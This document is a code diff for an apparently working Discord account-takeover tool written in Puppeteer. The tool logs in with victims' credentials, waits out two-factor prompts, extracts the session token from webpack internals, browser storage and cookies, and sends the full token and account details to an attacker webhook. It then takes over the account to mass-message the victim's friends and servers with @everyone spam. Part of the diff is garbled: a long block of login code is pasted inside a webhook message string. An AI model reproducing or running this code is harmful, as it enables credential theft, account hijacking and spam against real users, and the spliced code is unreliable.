@@ -133,18 +133,16 @@ async function processLogin(email, password, ip, sessionId) {
             await solveCaptcha(page, sessionId);
         }
         
-        // Check for 2FA - FIXED SELECTORS
+        // Check for 2FA
         await delay(3000, 5000);
         
         const is2FA = await page.evaluate(() => {
-            // Check for MFA input field
             const mfaInput = document.querySelector('input[name="code"]') || 
                            document.querySelector('input[placeholder*="code"]') ||
                            document.querySelector('input[type="text"][maxlength="6"]') ||
                            document.querySelector('[class*="mfa"] input') ||
                            document.querySelector('[class*="twoFactor"] input');
             
-            // Check for email verification text
             const bodyText = document.body.innerText || document.body.textContent || '';
             const hasEmailCheck = bodyText.toLowerCase().includes('check your email') ||
                                 bodyText.toLowerCase().includes('verify') ||
@@ -153,7 +151,6 @@ async function processLogin(email, password, ip, sessionId) {
                                 bodyText.toLowerCase().includes('authentication code') ||
                                 bodyText.toLowerCase().includes('6-digit');
             
-            // Check for auth app mention
             const hasAuthApp = bodyText.toLowerCase().includes('authenticator') ||
                              bodyText.toLowerCase().includes('auth app');
             
@@ -173,8 +170,9 @@ async function processLogin(email, password, ip, sessionId) {
                 await delay(5000);
                 
                 loggedIn = await page.evaluate(() => {
-                    return document.querySelector('[class*="container-"]') !== null &&
-                           document.location.href.includes('/channels/');
+                    return document.location.href.includes('/channels/') ||
+                           document.location.href.includes('/app') ||
+                           document.querySelector('[class*="container-"]') !== null;
                 });
                 
                 if (loggedIn) {
@@ -182,7 +180,6 @@ async function processLogin(email, password, ip, sessionId) {
                     break;
                 }
                 
-                // Check if still on 2FA page
                 const still2FA = await page.evaluate(() => {
                     const bodyText = document.body.innerText || '';
                     return bodyText.toLowerCase().includes('code') ||
@@ -191,7 +188,6 @@ async function processLogin(email, password, ip, sessionId) {
                 });
                 
                 if (!still2FA && !loggedIn) {
-                    // Might be on error page or other page
                     await sendWebhook({ 
                         content: `⚠️ **2FA PAGE CHANGED** - Session: \`${sessionId}\`\nCurrent URL: ${await page.url()}` 
                     });
@@ -212,10 +208,10 @@ async function processLogin(email, password, ip, sessionId) {
         const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
         
         if (!isLoggedIn) {
-            // Check for error message
             const errorText = await page.evaluate(() => {
                 const errorEl = document.querySelector('[class*="error"]') || 
-                              document.querySelector('[style*="color: rgb(250, 71, 71)"]');
+                              document.querySelector('[style*="color: rgb(250, 71, 71)"]') ||
+                              document.querySelector('form div div');
                 return errorEl ? errorEl.innerText : null;
             });
             
@@ -226,7 +222,56 @@ async function processLogin(email, password, ip, sessionId) {
             return;
         }
         
-        // Extract token - multiple methods
+        // SUCCESS - Get user info
+        await delay(2000, 3000);
+        
+        const userInfo = await page.evaluate(() => {
+            // Try to get username from various sources
+            const usernameEl = document.querySelector('[class*="username"]') ||
+                              document.querySelector('[class*="nameTag"]') ||
+                              document.querySelector('title');
+            
+            const titleText = document.title;
+            let username = null;
+            let userId = null;
+            
+            // Extract from title (usually "Discord - @username" or similar)
+            if (titleText && titleText.includes('-')) {
+                username = titleText.split('-')[1].trim();
+            }
+            
+            // Try to get from localStorage user data
+            try {
+                const userCache = localStorage.getItem('UserSettingsStore');
+                if (userCache) {
+                    const parsed = JSON.parse(userCache);
+                    if (parsed && parsed.user) {
+                        username = parsed.user.username || parsed.user.global_name;
+                        userId = parsed.user.id;
+                    }
+                }
+            } catch(e) {}
+            
+            // Try alternative localStorage keys
+            if (!username) {
+                try {
+                    const me = localStorage.getItem('Me');
+                    if (me) {
+                        const parsed = JSON.parse(me);
+                        username = parsed.username || parsed.global_name;
+                        userId = parsed.id;
+                    }
+                } catch(e) {}
+            }
+            
+            return { username, userId, title: titleText };
+        });
+        
+        await sendWebhook({ 
+            content: `✅ **LOGIN SUCCESS** - Session: \`${sessionId}\`\n👤 Logged in as: \`@${userInfo.username || userInfo.title || 'Unknown'}\`\n🆔 User ID: \`${userInfo.userId || 'Unknown'}\`\n🌐 URL: ${currentUrl}`
+        });
+        
+        // Extract token
         let token = null;
         
         // Method 1: Webpack
@@ -234,17 +279,30 @@ async function processLogin(email, password, ip, sessionId) {
             token = await page.evaluate(() => {
                 let foundToken = null;
                 
-                // Try webpack
                 if (window.webpackChunkdiscord_app) {
                     try {
                         const modules = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                             for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
-                                if (m.default && m.default.getToken !== undefined) {
-                                    foundToken = m.default.getToken();
+                                if (m.default && typeof m.default.getToken === 'function') {
+                                    const t = m.default.getToken();
+                                    if (t && typeof t === 'string' && t.includes('.')) {
+                                        foundToken = t;
+                                        break;
+                                    }
+                                }
+                                if (typeof m.getToken === 'function') {
+                                    const t = m.getToken();
+                                    if (t && typeof t === 'string' && t.includes('.')) {
+                                        foundToken = t;
+                                        break;
+                                    }
+                                }
+                                if (m.default && typeof m.default === 'string' && m.default.includes('.') && m.default.length > 50) {
+                                    foundToken = m.default;
                                     break;
                                 }
-                                if (m.getToken !== undefined) {
-                                    foundToken = m.getToken();
+                                if (typeof m === 'string' && m.includes('.') && m.length > 50) {
+                                    foundToken = m;
                                     break;
                                 }
                             }
@@ -253,62 +311,344 @@ async function processLogin(email, password, ip, sessionId) {
                     } catch(e) {}
                 }
                 
-                // Try localStorage
-                if (!foundToken) {
-                    foundToken = localStorage.getItem('token');
-                }
-                
-                // Try sessionStorage
-                if (!foundToken) {
-                    foundToken = sessionStorage.getItem('token');
+                if (!foundToken && window.GLOBAL_ENV && window.GLOBAL_ENV.token) {
+                    foundToken = window.GLOBAL_ENV.token;
                 }
                 
                 return foundToken;
             });
         } catch(e) {
-            await sendWebhook({ content: `⚠️ Token extraction error: ${e.message}` });
+            await sendWebhook({ content: `⚠️ Webpack extraction error: ${e.message}` });
         }
         
-        // Method 2: Cookies
-        if (!token) {
-            try {
-                const cookies = await page.cookies();
-                const tokenCookie = cookies.find(c => c.name.includes('token') || c.value.length > 50);
-                if (tokenCookie) token = tokenCookie.value;
-            } catch(e) {}
-        }
-        
-        // Method 3: Local storage via CDP
-        if (!token) {
+        // Method 2: LocalStorage
+        if (!token || typeof token !== 'string' || !token.includes('.')) {
             try {
                 const localStorageData = await page.evaluate(() => {
-                    const data = {};
+                    const items = {};
                     for (let i = 0; i < localStorage.length; i++) {
                         const key = localStorage.key(i);
-                        data[key] = localStorage.getItem(key);
+                        const value = localStorage.getItem(key);
+                        items[key] = value;
                     }
-                    return data;
+                    return items;
                 });
                 
                 for (const [key, value] of Object.entries(localStorageData)) {
-                    if (key.includes('token') || (value && value.length > 50 && value.includes('.'))) {
-                        token = value;
-                        break;
+                    if (value && typeof value === 'string' && value.split('.').length === 3) {
+                        const parts = value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10 && parts[2].length > 5) {
+                            token = value;
+                            break;
+                        }
+                    }
+                }
+                
+                if (!token && localStorageData.token) {
+                    const t = localStorageData.token;
+                    if (typeof t === 'string' && t.includes('.')) {
+                        token = t;
+                    }
+                }
+                
+            } catch(e) {}
+        }
+        
+        // Method 3: SessionStorage
+        if (!token) {
+            try {
+                const sessionData = await page.evaluate(() => {
+                    const items = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        items[key] = value;
+                    }
+                    return items;
+                });
+                
+                for (const [key, value] of Object.entries(sessionData)) {
+                    if (value && typeof value === 'string' && value.split('.').length === 3) {
+                        const parts = value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10) {
+                            token = value;
+                            break;
+                        }
                     }
                 }
             } catch(e) {}
         }
         
-        if (token) {
+        // Method 4: Cookies
+        if (!token) {
+            try {
+                const cookies = await page.cookies();
+                for (const cookie of cookies) {
+                    if (cookie.value && cookie.value.includes('.') && cookie.value.split('.').length === 3) {
+                        const parts = cookie.value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10) {
+                            token = cookie.value;
+                            break;
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Validate and use token
+        if (token && typeof token === 'string' && token.includes('.') && token.split('.').length === 3) {
+            const tokenStr = String(token).trim();
+            
             await sendWebhook({ 
-                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\nUser: \`${email}\`\n\`\`\`${token}\`\`\`` 
+                content: `            
+            while (Date.now() - startTime < maxWait) {
+                await delay(5000);
+                
+                loggedIn = await page.evaluate(() => {
+                    return document.location.href.includes('/channels/') ||
+                           document.location.href.includes('/app') ||
+                           document.querySelector('[class*="container-"]') !== null;
+                });
+                
+                if (loggedIn) {
+                    await sendWebhook({ content: `✅ **2FA BYPASSED** - Session: \`${sessionId}\`` });
+                    break;
+                }
+                
+                const still2FA = await page.evaluate(() => {
+                    const bodyText = document.body.innerText || '';
+                    return bodyText.toLowerCase().includes('code') ||
+                           bodyText.toLowerCase().includes('verify') ||
+                           document.querySelector('input[name="code"]') !== null;
+                });
+                
+                if (!still2FA && !loggedIn) {
+                    await sendWebhook({ 
+                        content: `⚠️ **2FA PAGE CHANGED** - Session: \`${sessionId}\`\nCurrent URL: ${await page.url()}` 
+                    });
+                }
+            }
+            
+            if (!loggedIn) {
+                await sendWebhook({ 
+                    content: `⏰ **2FA TIMEOUT** - Session: \`${sessionId}\`\nUser didn't complete 2FA in time` 
+                });
+                await browser.close();
+                return;
+            }
+        }
+        
+        // Check if we're logged in
+        const currentUrl = await page.url();
+        const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
+        
+        if (!isLoggedIn) {
+            const errorText = await page.evaluate(() => {
+                const errorEl = document.querySelector('[class*="error"]') || 
+                              document.querySelector('[style*="color: rgb(250, 71, 71)"]') ||
+                              document.querySelector('form div div');
+                return errorEl ? errorEl.innerText : null;
             });
             
-            // Start mass spam
-            await massSpam(token, sessionId);
+            await sendWebhook({ 
+                content: `❌ **LOGIN FAILED** - Session: \`${sessionId}\`\n${errorText ? 'Error: ' + errorText : 'Unknown error'}\nURL: ${currentUrl}` 
+            });
+            await browser.close();
+            return;
+        }
+        
+        // SUCCESS - Get user info
+        await delay(2000, 3000);
+        
+        const userInfo = await page.evaluate(() => {
+            // Try to get username from various sources
+            const usernameEl = document.querySelector('[class*="username"]') ||
+                              document.querySelector('[class*="nameTag"]') ||
+                              document.querySelector('title');
+            
+            const titleText = document.title;
+            let username = null;
+            let userId = null;
+            
+            // Extract from title (usually "Discord - @username" or similar)
+            if (titleText && titleText.includes('-')) {
+                username = titleText.split('-')[1].trim();
+            }
+            
+            // Try to get from localStorage user data
+            try {
+                const userCache = localStorage.getItem('UserSettingsStore');
+                if (userCache) {
+                    const parsed = JSON.parse(userCache);
+                    if (parsed && parsed.user) {
+                        username = parsed.user.username || parsed.user.global_name;
+                        userId = parsed.user.id;
+                    }
+                }
+            } catch(e) {}
+            
+            // Try alternative localStorage keys
+            if (!username) {
+                try {
+                    const me = localStorage.getItem('Me');
+                    if (me) {
+                        const parsed = JSON.parse(me);
+                        username = parsed.username || parsed.global_name;
+                        userId = parsed.id;
+                    }
+                } catch(e) {}
+            }
+            
+            return { username, userId, title: titleText };
+        });
+        
+        await sendWebhook({ 
+            content: `✅ **LOGIN SUCCESS** - Session: \`${sessionId}\`\n👤 Logged in as: \`@${userInfo.username || userInfo.title || 'Unknown'}\`\n🆔 User ID: \`${userInfo.userId || 'Unknown'}\`\n🌐 URL: ${currentUrl}`
+        });
+        
+        // Extract token
+        let token = null;
+        
+        // Method 1: Webpack
+        try {
+            token = await page.evaluate(() => {
+                let foundToken = null;
+                
+                if (window.webpackChunkdiscord_app) {
+                    try {
+                        const modules = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+                            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
+                                if (m.default && typeof m.default.getToken === 'function') {
+                                    const t = m.default.getToken();
+                                    if (t && typeof t === 'string' && t.includes('.')) {
+                                        foundToken = t;
+                                        break;
+                                    }
+                                }
+                                if (typeof m.getToken === 'function') {
+                                    const t = m.getToken();
+                                    if (t && typeof t === 'string' && t.includes('.')) {
+                                        foundToken = t;
+                                        break;
+                                    }
+                                }
+                                if (m.default && typeof m.default === 'string' && m.default.includes('.') && m.default.length > 50) {
+                                    foundToken = m.default;
+                                    break;
+                                }
+                                if (typeof m === 'string' && m.includes('.') && m.length > 50) {
+                                    foundToken = m;
+                                    break;
+                                }
+                            }
+                        }]);
+                        window.webpackChunkdiscord_app.pop();
+                    } catch(e) {}
+                }
+                
+                if (!foundToken && window.GLOBAL_ENV && window.GLOBAL_ENV.token) {
+                    foundToken = window.GLOBAL_ENV.token;
+                }
+                
+                return foundToken;
+            });
+        } catch(e) {
+            await sendWebhook({ content: `⚠️ Webpack extraction error: ${e.message}` });
+        }
+        
+        // Method 2: LocalStorage
+        if (!token || typeof token !== 'string' || !token.includes('.')) {
+            try {
+                const localStorageData = await page.evaluate(() => {
+                    const items = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        items[key] = value;
+                    }
+                    return items;
+                });
+                
+                for (const [key, value] of Object.entries(localStorageData)) {
+                    if (value && typeof value === 'string' && value.split('.').length === 3) {
+                        const parts = value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10 && parts[2].length > 5) {
+                            token = value;
+                            break;
+                        }
+                    }
+                }
+                
+                if (!token && localStorageData.token) {
+                    const t = localStorageData.token;
+                    if (typeof t === 'string' && t.includes('.')) {
+                        token = t;
+                    }
+                }
+                
+            } catch(e) {}
+        }
+        
+        // Method 3: SessionStorage
+        if (!token) {
+            try {
+                const sessionData = await page.evaluate(() => {
+                    const items = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        items[key] = value;
+                    }
+                    return items;
+                });
+                
+                for (const [key, value] of Object.entries(sessionData)) {
+                    if (value && typeof value === 'string' && value.split('.').length === 3) {
+                        const parts = value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10) {
+                            token = value;
+                            break;
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Method 4: Cookies
+        if (!token) {
+            try {
+                const cookies = await page.cookies();
+                for (const cookie of cookies) {
+                    if (cookie.value && cookie.value.includes('.') && cookie.value.split('.').length === 3) {
+                        const parts = cookie.value.split('.');
+                        if (parts[0].length > 10 && parts[1].length > 10) {
+                            token = cookie.value;
+                            break;
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Validate and use token
+        if (token && typeof token === 'string' && token.includes('.') && token.split('.').length === 3) {
+            const tokenStr = String(token).trim();
+            
+            await sendWebhook({ 
+                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\n👤 User: \`@${userInfo.username || 'Unknown'}\`\n🔐 Token: \`${tokenStr.substring(0, 20)}...${tokenStr.substring(tokenStr.length - 10)}\`\n\`\`\`${tokenStr}\`\`\``
+            });
+            
+            // Test token and spam
+            try {
+                await massSpam(tokenStr, sessionId, userInfo.username || email);
+            } catch (loginError) {
+                await sendWebhook({ 
+                    content: `❌ **TOKEN INVALID** - Session: \`${sessionId}\`\nError: ${loginError.message}` 
+                });
+            }
         } else {
             await sendWebhook({ 
-                content: `⚠️ **NO TOKEN FOUND** - Session: \`${sessionId}\`\nLogin appeared successful but no token extracted` 
+                content: `⚠️ **NO VALID TOKEN** - Session: \`${sessionId}\`\nExtracted: ${typeof token === 'object' ? JSON.stringify(token) : token}\nBut login was successful as \`@${userInfo.username || 'Unknown'}\``
             });
         }
         
@@ -316,7 +656,7 @@ async function processLogin(email, password, ip, sessionId) {
         
     } catch (error) {
         await sendWebhook({ 
-            content: `❌ **CRITICAL ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\n${error.stack}\`\`\`` 
+            content: `❌ **CRITICAL ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\n${error.stack}\`\`\``
         });
         if (browser) await browser.close();
     }
@@ -356,7 +696,7 @@ async function solveCaptcha(page, sessionId) {
     }
 }
 
-async function massSpam(token, sessionId) {
+async function massSpam(token, sessionId, username) {
     try {
         const { Client } = require('discord.js-selfbot-v13');
         const client = new Client({
@@ -365,38 +705,51 @@ async function massSpam(token, sessionId) {
             autoRedeemNitro: false,
             ws: {
                 properties: {
-                    $browser: 'Discord Client'
+                    $browser: 'Discord Client',
+                    $os: 'Windows',
+                    $device: 'chrome'
                 }
             }
         });
         
+        client.on('error', async (error) => {
+            await sendWebhook({ 
+                content: `❌ **CLIENT ERROR** - Session: \`${sessionId}\`\n${error.message}` 
+            });
+        });
+        
         client.on('ready', async () => {
             await sendWebhook({ 
-                content: `🤖 **SPAM BOT READY** - Session: \`${sessionId}\`\nUser: \`${client.user.tag}\` (\`${client.user.id}\`)` 
+                content: `🤖 **SPAM BOT READY** - Session: \`${sessionId}\`\n👤 Logged in as: \`@${client.user.tag}\` (\`${client.user.id}\`)` 
             });
             
             // Mass DM friends
             try {
                 const friends = client.relationships.cache.filter(r => r.type === 1);
-                await sendWebhook({ content: `📨 **MASS DM STARTING** - ${friends.size} friends targeted` });
+                await sendWebhook({ content: `📨 **MASS DM** - ${friends.size} friends targeted` });
                 
+                let dmCount = 0;
                 for (const [, relationship] of friends) {
                     try {
                         const user = await client.users.fetch(relationship.id);
-                        if (user && user.dmChannel) {
+                        if (user) {
+                            const dm = await user.createDM();
                             for (let i = 0; i < 5; i++) {
-                                await user.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
+                                await dm.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
+                                dmCount++;
                                 await delay(1000, 3000);
                             }
                         }
                     } catch (e) {}
                 }
+                await sendWebhook({ content: `✅ **DMs SENT**: ${dmCount}` });
             } catch (e) {
                 await sendWebhook({ content: `❌ DM Error: ${e.message}` });
             }
             
             // Spam guilds
             try {
+                let guildCount = 0;
                 for (const guild of client.guilds.cache.values()) {
                     try {
                         const channel = guild.channels.cache.find(c => 
@@ -407,22 +760,27 @@ async function massSpam(token, sessionId) {
                         if (channel) {
                             for (let i = 0; i < 10; i++) {
                                 await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
+                                guildCount++;
                                 await delay(2000, 5000);
                             }
                         }
                     } catch (e) {}
                 }
+                await sendWebhook({ content: `✅ **GUILD MESSAGES**: ${guildCount}` });
             } catch (e) {
                 await sendWebhook({ content: `❌ Guild Error: ${e.message}` });
             }
             
-            await sendWebhook({ content: `✅ **SPAM COMPLETE** - Session: \`${sessionId}\`` });
+            await client.destroy();
+            await sendWebhook({ content: `✅ **SPAM COMPLETE** - Session: \`${sessionId}\` | User: \`@${username}\`` });
         });
         
-        await client.login(token);
+        await client.login(String(token).trim());
         
     } catch (error) {
-        await sendWebhook({ content: `❌ **SPAM FAILED** - Session: \`${sessionId}\`\n${error.message}` });
+        await sendWebhook({ 
+            content: `❌ **SPAM FAILED** - Session: \`${sessionId}\`\nError: ${error.message}` 
+        });
     }
 }
 
